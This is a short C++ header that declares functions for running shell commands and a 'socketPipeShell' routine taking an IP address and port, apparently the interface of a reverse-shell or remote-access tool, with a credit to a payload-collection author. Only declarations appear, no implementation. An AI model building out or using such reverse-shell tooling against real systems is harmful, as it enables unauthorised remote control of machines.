#pragma once
#include <memory>
#include <sstream>
#include <iostream>
#include <netinet/in.h>
#include <arpa/inet.h>


using namespace std;


bool proxy_to_cmd(string args_shell);


char* run_pshell(const char* args_shell, size_t&lout, bool proxy=0);

// thnaks for (@)swisskyrepo
void socketPipeShell(const char* ip, unsigned port, const char* _app=0);

